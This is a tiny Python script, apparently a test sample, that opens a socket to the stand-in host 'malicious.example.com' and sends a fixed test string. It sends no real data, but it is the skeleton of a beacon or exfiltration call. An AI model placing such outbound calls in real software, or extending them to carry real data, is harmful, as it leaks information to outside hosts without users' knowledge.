import socket

def create_malicious_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("malicious.example.com", 8080))
    s.sendall(b"Hello, this is a test connection")
    s.close()

if __name__ == "__main__":
    create_malicious_connection()
